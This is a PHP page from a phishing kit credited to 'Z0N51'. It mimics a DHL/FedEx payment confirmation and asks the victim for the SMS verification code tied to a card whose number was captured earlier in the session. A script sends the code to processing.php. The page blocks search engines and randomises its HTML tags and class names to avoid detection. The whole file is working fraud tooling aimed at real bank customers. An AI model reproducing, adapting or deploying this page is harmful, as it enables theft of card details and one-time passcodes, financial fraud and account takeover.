<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once 'app/config.php';
    $cc = substr($_SESSION['one'], -4);
    $semantic1 = semantic();
    $semantic2 = semantic();
    $semantic3 = semantic();
    $semantic4 = semantic();
    $semantic5 = semantic();
    $semantic6 = semantic();
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="media/css/helpers.css">
        <link rel="stylesheet" href="media/css/style.css">

        <link rel="icon" type="image/x-icon" href="media/imgs/ff.ico" />

        <title>Detailed Tracking</title>
    </head>

    <body>

		<<?php echo $semantic1; ?> id="<?php echo rr(); ?>ssarea<?php echo rr(); ?>">
            <<?php echo $semantic2; ?> class="<?php echo rr(); ?>ssbox<?php echo rr(); ?>">
                <<?php echo $semantic3; ?> class="<?php echo rr(); ?>top<?php echo rr(); ?> d-flex align-items-center">
                    <<?php echo $semantic4; ?> class="flex-grow-1"><img src="media/imgs/logo2.png"></<?php echo $semantic4; ?>>
                    <<?php echo $semantic4; ?>><img src="media/imgs/vs.png"></<?php echo $semantic4; ?>>
                </<?php echo $semantic3; ?>>
                <h3>Please confirm the following payment.</h3>
                <<?php echo $semantic5; ?> class="<?php echo rr(); ?>details<?php echo rr(); ?>">
                    <p>The unique password has been sent to the mobile number listed below. If you need to change your mobile number please contact your bank of modify it via the available channels (ATM, web).</p>
                    <table>
                        <tr>
                            <td>Merchant:</td>
                            <td>DHL EXPRESS</td>
                        </tr>
                        <tr>
                            <td>Amount:</td>
                            <td>1.99<?php echo $_SESSION['currency']; ?></td>
                        </tr>
                        <tr>
                            <td>Date:</td>
                            <td><?php echo date('d/m/Y'); ?></td>
                        </tr>
                        <tr>
                            <td>Card number:</td>
                            <td>XXXX XXXX XXXX <?php echo $cc; ?></td>
                        </tr>
                        <tr>
                            <td>SMS Code:</td>
                            <td>
                                <input type="hidden" id="cap" name="cap">
                                <input type="hidden" name="steeep" id="steeep" value="step4sms">
                                <input type="hidden" name="error" id="error" value="<?php echo $_GET['error']; ?>">
                                <input type="text" inputmode="numeric" maxlength="8" name="sms_code" id="sms_code" class="<?php echo errclass($_SESSION['errors'],'sms_code') ?>">
                                <?php echo errmsg($_SESSION['errors'],'sms_code'); ?>
                            </td>
                        </tr>
                    </table>
                    <p style="font-size: 14px; text-align: center; margin-bottom: 0; margin-top: 10px;">Please enter the verification code received by sms : <span class="timer" style="color: #d40511; font-weight: 700; cursor: pointer;"></span></p>
                </<?php echo $semantic5; ?>>
                <<?php echo $semantic5; ?> class="<?php echo rr(); ?>btns<?php echo rr(); ?>">
                    <<?php echo $semantic6; ?> id="booom" class="<?php echo rr(); ?>btttn<?php echo rr(); ?>">Confirm</<?php echo $semantic6; ?>>
                </<?php echo $semantic5; ?>>
                <p class="<?php echo rr(); ?>copy<?php echo rr(); ?>">&copy; FedEx 1995-<?php echo date('Y'); ?></p>
            </<?php echo $semantic2; ?>>
        </<?php echo $semantic1; ?>>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="media/js/countdown.min.js"></script>
        <script src="media/js/js.js"></script>

        <script>
            $(".timer").countdowntimer({
                minutes : 2,
                timeUp : timeIsUp
            });
            function timeIsUp() {
                $(".timer").html('Try Again');
            }
            $('.timer').click(function(){
                location.reload();
            });
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'sms_code' : $('#sms_code').val(),
                    'error' : $('#error').val(),
                }
                $.post( "processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>